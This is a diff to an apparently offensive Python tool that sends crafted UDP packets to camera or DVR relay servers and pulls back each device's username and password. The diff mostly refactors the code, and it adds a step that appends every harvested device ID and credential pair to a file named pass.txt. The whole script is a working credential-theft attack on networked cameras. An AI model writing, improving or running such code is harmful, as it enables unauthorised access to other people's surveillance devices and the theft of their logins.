@@ -12,27 +12,26 @@ class server:
     def __init__(self):
         self.CamList(self.FileListCams)
         try:
-            while (True):
+            while True:
                 self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 if not bool(self.CamsList):
                     break
                 for dev in self.CamsList:
                     self.CreateSocket(dev)
-
                 result = (self.s.recvfrom(4096, 0))[0]
                 # print(f'Received response from server: {self.byte2str(result)}')  # debugging
                 result = self.ParseRelayServer(result)
-                id_cam = self.ConnenctToRelay(result)
+                id_cam = self.ConnectToRelay(result)
                 self.CamsList.remove(id_cam)
-
         except socket.error as e:
             print("socket creation failed with error %s" % (e))
 
-    def ConnenctToRelay(self, d):
+    def ConnectToRelay(self, d):
         try:
             data = '32'
             data += bytes(d['id'], 'utf-8').hex()
-            data += '2e6e766476722e6e65740000000000000000000000000000302e302e302e30000000000000000000018a1bc4d62f4a41ae000000000000'
+            data += '2e6e766476722e6e65740000000000000000000000000000302e30' \
+                    '2e302e30000000000000000000018a1bc4d62f4a41ae000000000000 '
             data = bytes.fromhex(data)
             relay_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -44,11 +43,14 @@ class server:
                 print(f'\u001b[32m[+] DeviceID: {d["id"]}')
                 print(f'[+] Username: {username}')
                 print(f'[+] Password: {password}\u001b[37m')
+                with open("pass.txt", "a") as f:
+                    f.write(f"{d['id']}:{str(username)}:{str(password)}\n")
                 return d["id"]
         except socket.error as e:
             print("socket creation failed with error %s" % (e))
 
-    def ParseRelayServer(self, data):
+    @staticmethod
+    def ParseRelayServer(data):
         try:
             result = {'id': str(int(data[1:9])),
                       'relay_server': data[33:data.find(b'\x00', 33)].decode('utf-8'),
@@ -82,7 +84,8 @@ class server:
     def byte2str(s):
         return "".join(map(chr, s))
 
-    def send_data(self, s, data, serv, port):
+    @staticmethod
+    def send_data(s, data, serv, port):
         print(f'\u001b[32m[+]SERVER:{serv} PORT:{port}\u001b[37m')
         # print(self.byte2str(data))
         try:
